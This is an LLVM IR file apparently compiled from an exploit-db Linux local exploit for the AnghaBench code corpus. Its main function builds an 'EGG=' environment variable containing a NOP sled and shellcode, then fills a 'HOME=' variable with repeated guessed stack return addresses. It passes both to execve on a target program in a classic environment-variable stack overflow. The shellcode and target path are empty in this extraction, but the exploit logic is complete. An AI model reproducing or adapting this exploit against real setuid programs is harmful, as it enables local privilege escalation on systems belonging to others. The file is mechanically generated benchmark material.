; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_914.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_914.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFLEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [6 x i8] c"HOME=\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [2 x i8*], align 16
  %11 = alloca [3 x i8*], align 16
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @BUFLEN, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %6, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %7, align 8
  %18 = call i64 @malloc(i32 1000)
  %19 = inttoptr i64 %18 to i8*
  store i8* %19, i8** %12, align 8
  %20 = load i8*, i8** %12, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* %20, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  %24 = load i8*, i8** @shellcode, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = sub nsw i32 999, %25
  %27 = call i32 @memset(i8* %23, i32 144, i32 %26)
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 4
  %30 = getelementptr inbounds i8, i8* %29, i64 1000
  %31 = getelementptr inbounds i8, i8* %30, i64 -1
  %32 = load i8*, i8** @shellcode, align 8
  %33 = call i32 @strlen(i8* %32)
  %34 = sext i32 %33 to i64
  %35 = sub i64 0, %34
  %36 = getelementptr inbounds i8, i8* %31, i64 %35
  %37 = load i8*, i8** @shellcode, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %36, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %37)
  %39 = load i8*, i8** %12, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = sub i32 -1073741830, %40
  %42 = load i8*, i8** @PATH, align 8
  %43 = call i32 @strlen(i8* %42)
  %44 = sub i32 %41, %43
  %45 = zext i32 %44 to i64
  store i64 %45, i64* %13, align 8
  store i8* %17, i8** %9, align 8
  %46 = trunc i64 %15 to i32
  %47 = call i32 @bzero(i8* %17, i32 %46)
  %48 = call i32 @strcpy(i8* %17, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  store i32 5, i32* %8, align 4
  br label %49

49:                                               ; preds = %60, %2
  %50 = load i32, i32* %8, align 4
  %51 = load i32, i32* @BUFLEN, align 4
  %52 = icmp sle i32 %50, %51
  br i1 %52, label %53, label %63

53:                                               ; preds = %49
  %54 = load i64, i64* %13, align 8
  %55 = load i8*, i8** %9, align 8
  %56 = load i32, i32* %8, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = bitcast i8* %58 to i64*
  store i64 %54, i64* %59, align 8
  br label %60

60:                                               ; preds = %53
  %61 = load i32, i32* %8, align 4
  %62 = add nsw i32 %61, 4
  store i32 %62, i32* %8, align 4
  br label %49

63:                                               ; preds = %49
  %64 = load i8*, i8** @PATH, align 8
  %65 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  store i8* %64, i8** %65, align 16
  %66 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 1
  store i8* null, i8** %66, align 8
  %67 = load i8*, i8** %12, align 8
  %68 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 0
  store i8* %67, i8** %68, align 16
  %69 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 1
  store i8* %17, i8** %69, align 8
  %70 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 2
  store i8* null, i8** %70, align 16
  %71 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %72 = load i8*, i8** %71, align 16
  %73 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %74 = getelementptr inbounds [3 x i8*], [3 x i8*]* %11, i64 0, i64 0
  %75 = call i32 @execve(i8* %72, i8** %73, i8** %74)
  store i32 0, i32* %3, align 4
  %76 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %76)
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
